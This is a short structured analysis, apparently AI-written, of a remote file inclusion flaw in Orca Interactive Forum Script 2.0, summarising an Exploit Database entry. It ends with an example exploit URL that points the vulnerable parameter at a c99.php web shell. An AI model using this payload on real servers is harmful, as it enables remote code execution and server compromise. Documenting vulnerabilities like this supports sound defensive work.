Based on the provided content, here's a breakdown of the vulnerability:

**Root cause of vulnerability:**
- The vulnerability is due to a Remote File Inclusion (RFI) flaw in the `params.php` file of the Orca Interactive Forum Script. The script uses a variable `$gConf['dir']['layouts']` to include files, which is not properly sanitized, allowing an attacker to control the path and include remote files.

**Weaknesses/vulnerabilities present:**
- Remote File Inclusion (RFI): The application includes files based on user-controlled input without proper sanitization.

**Impact of exploitation:**
- An attacker can include and execute arbitrary code on the server by providing a malicious URL in the `gConf[dir][layouts]` parameter. This could lead to a complete compromise of the server, data theft, or other malicious activities.

**Attack vectors:**
- The vulnerability is triggered through an HTTP GET request.
- The attacker manipulates the `gConf[dir][layouts]` parameter in the URL to point to a malicious script hosted on a remote server.

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the server running the vulnerable application.
- The attacker needs a remote server to host the malicious script that will be included.

**Technical details from Exploit Database:**
- Vulnerable parameter: `gConf[dir][layouts]`
- Vulnerable file: `layout/default/params.php`
- Example exploit URL: `http://127.0.0.1/cms/Orca-2.0.beta2/layout/default/params.php?gConf[dir][layouts]=http://127.0.0.1/c99.php?`
- Vulnerable application: Orca Interactive Forum Script version 2.0 and 2.0.2
